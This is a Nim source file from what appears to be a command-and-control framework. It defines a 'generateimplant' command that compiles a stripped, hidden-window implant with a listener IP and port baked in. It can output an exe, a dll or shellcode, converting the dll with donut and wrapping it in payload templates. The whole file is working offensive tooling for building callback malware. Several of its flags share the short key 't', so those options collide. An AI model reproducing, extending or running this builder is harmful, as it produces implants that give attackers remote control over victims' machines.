import ../prelude

import ../../templates/templates

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  
  var listenerType: string = flags.getOrDefault("type", flags.getOrDefault("t", ""))
  var listenerName: string = flags.getOrDefault("listener", flags.getOrDefault("l", ""))
  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
  var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
  var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
  var tmpl: string = flags.getOrDefault("template", flags.getOrDefault("t", "none"))
  var format: string = flags.getOrDefault("format", flags.getOrDefault("f", "dll"))
  var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
  var autoConnectTime: string = flags.getOrDefault("autoconnect", flags.getOrDefault("t", "5000"))

  when not defined(windows):
    if format == "shellcode":
      errorLog "can't generate shellcode on linux"
      return

  if listenerType == "tcp" and ip == "" and port == "":
    errorLog "you must specify and --ip and --port for the tcp client"
    return
  else:
    for listener in server.listeners:
      if listener.title == listenerName:
        infoLog "generating an implant for " & $listener
        ip = listener.ipAddress
        port = $listener.port.uint
        listenerType = listener.listenerType

  var useTemplate = tmpl != "none"
  
  if useTemplate and format != "dll":
    errorLog "if you want to use template, you must compile as a dll"
    return

  let compileCommand = "nim -d:client " &
    (if showWindow or format == "dll": "" else: "--app=gui " & " ") & # disable window
    (if format == "dll": "--app=lib --nomain " else: "") & 
    "--passL:-s --passL:-Wl,--gc-sections -a:off -x:off --lineTrace:off --stackTrace:off --threads:off --opt:size" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:" & listenerType & " " & 
    "-d:port=" & port & " " & 
    "-d:autoConnectTime=" & autoConnectTime & " " & 
    (if platform == "windows": "-d:mingw " else: "--os:linux ") & 
    (if server.debug: "-d:debug " else: " ") & 
    "-o:implant" & 
    (
      if platform == "windows" and format == "dll": ".dll" 
      elif platform == "windows" and format == "exe": ".exe" 
      else: ""
    ) & " " &
    "c ./src/client/client.nim"

  infoLog "Running: " & compileCommand
  
  var exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to compiled implant"
  else:
    successLog "successfully saved implant" & (if useTemplate: ", applying template.." else: "")
  
  if not useTemplate: return

  if not fileExists("tools/donut/donut.exe"):
    errorLog "couldn't find donut at ./tools/donut/donut.exe"
    return

  exitCode = execCmd("tools/donut/donut.exe -f ./implant.dll")

  moveFile("payload.bin", "_payload.bin")

  let shellcode = readFile("_payload.bin")

  for tmpl1 in templates.templates:
    if tmpl1.name == tmpl:
      let fileName = "payload." & tmpl1.outExtension
      if fileExists(fileName): removeFile(fileName)
      let payload = tmpl1.build(shellcode)
      if payload != "": 
        writeFile(fileName, payload)
        successLog "payload saved to " & fileName 
      break

  # clean up temp files
  removeFile("implant.dll")
  removeFile("_payload.bin")

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant -l:[listenerName] -P:[platform] -t:[autoConnectTimeout]",
    "generateimplant -t:[listenerType] -i:[ip] -p:[port] -P:[platform] -t:[autoConnectTimeout]",
  ],
  description: "Generate an implant",
  category: CCImplants
)